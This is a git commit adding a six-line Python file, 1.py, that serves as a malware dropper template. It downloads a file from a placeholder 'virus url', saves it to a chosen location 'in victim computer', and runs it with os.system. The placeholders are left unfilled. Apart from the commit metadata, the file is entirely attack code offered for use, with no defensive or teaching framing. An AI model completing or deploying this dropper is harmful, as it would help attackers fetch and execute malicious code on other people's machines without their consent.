0eda8ae31d166836a3744969f3d24340bd633c75
ScRipt1337 <26287773+ScRiPt1337@users.noreply.github.com>
2018-06-15 21:39:29 +0530

    Add files via upload

---
+++ 1.py
@@ -0,0 +1,6 @@
+import os
+from urllib.request import urlretrieve
+
+urlretrieve("http:// enter your virus url here ", "enter where u want to save the file in victim computer")
+
+os.system("enter the command and path to lunch ur scipt")
